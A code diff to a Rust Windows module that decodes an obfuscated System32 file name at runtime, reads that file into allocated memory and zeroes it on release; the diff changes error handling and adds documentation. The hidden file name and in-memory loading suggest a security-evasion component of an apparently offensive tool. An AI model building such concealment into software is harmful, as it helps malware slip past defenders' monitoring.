@@ -14,8 +14,15 @@ use winapi::um::winnt::{
 };
 
 use crate::internal::crypto::coder::{decode, ENC};
-use crate::internal::err::fatal_err;
 
+/// Builds a full path to a file in `System32\` by appending the decoded filename
+/// to the `%SystemRoot%\System32\` or `%windir%\System32\` path.
+///
+/// # Arguments
+/// - `encoded`: UTF-16 encoded file name (null-terminated).
+///
+/// # Returns
+/// UTF-16-encoded full path ready to pass to `CreateFileW`.
 #[inline(always)]
 fn build_sys32_path(encoded: &[u16]) -> Vec<u16> {
     let base = env::var_os("SystemRoot")
@@ -34,7 +41,23 @@ fn build_sys32_path(encoded: &[u16]) -> Vec<u16> {
     full
 }
 
-pub unsafe fn buffer(out_size: &mut usize) -> *mut winapi::ctypes::c_void {
+/// Loads and maps a file from `System32` into memory, returning a read-write buffer.
+///
+/// The file name is obfuscated and decoded at runtime using the internal `coder::decode()` function.
+///
+/// # Arguments
+/// - `out_size`: pointer to a usize that receives the size of the mapped file.
+///
+/// # Returns
+/// A pointer to the memory buffer containing the file's contents. Returns `None` if any step fails.
+///
+/// # Safety
+/// This function performs raw memory allocation and Windows API calls. Caller must `VirtualFree()`
+/// the returned buffer after use using [`zero_and_free()`].
+///
+/// # Errors
+/// Returns `None` on any failure: file not found, bad permissions, allocation failure, etc.
+pub unsafe fn buffer(out_size: &mut usize) -> Option<*mut winapi::ctypes::c_void> {
     let decoded = decode(&ENC);
     let path_w = build_sys32_path(&decoded);
 
@@ -49,14 +72,13 @@ pub unsafe fn buffer(out_size: &mut usize) -> *mut winapi::ctypes::c_void {
     );
 
     if file == INVALID_HANDLE_VALUE {
-        let _code = GetLastError();
-        fatal_err("CreateFileW failed");
+        return None;
     }
 
     let file_size = GetFileSize(file, null_mut());
     if file_size == INVALID_FILE_SIZE || file_size == 0 {
         CloseHandle(file);
-        fatal_err("Invalid or empty file size");
+        return None;
     }
 
     let buffer = VirtualAlloc(
@@ -68,7 +90,7 @@ pub unsafe fn buffer(out_size: &mut usize) -> *mut winapi::ctypes::c_void {
 
     if buffer.is_null() {
         CloseHandle(file);
-        fatal_err("VirtualAlloc failed");
+        return None;
     }
 
     let mut bytes_read: DWORD = 0;
@@ -77,16 +99,25 @@ pub unsafe fn buffer(out_size: &mut usize) -> *mut winapi::ctypes::c_void {
 
     if !read_ok || bytes_read != file_size {
         VirtualFree(buffer, 0, MEM_RELEASE);
-        fatal_err("Failed to read file");
+        return None;
     }
 
     *out_size = file_size as usize;
-    
-    buffer
+    Some(buffer)
 }
 
+/// Zeroes and frees a memory buffer previously returned by [`buffer()`].
+///
+/// This function securely overwrites the contents of the memory region before releasing it.
+///
+/// # Arguments
+/// - `buffer`: pointer to memory region
+/// - `size`: number of bytes to zero
+///
+/// # Safety
+/// - `buffer` must have been returned by [`VirtualAlloc`] or [`buffer()`]
+/// - Undefined behavior if buffer is invalid or not sized correctly
 pub unsafe fn zero_and_free(buffer: *mut winapi::ctypes::c_void, size: usize) {
-
     if !buffer.is_null() {
         let mut ptr = buffer as *mut u64;
         let end = ptr.add(size / 8);
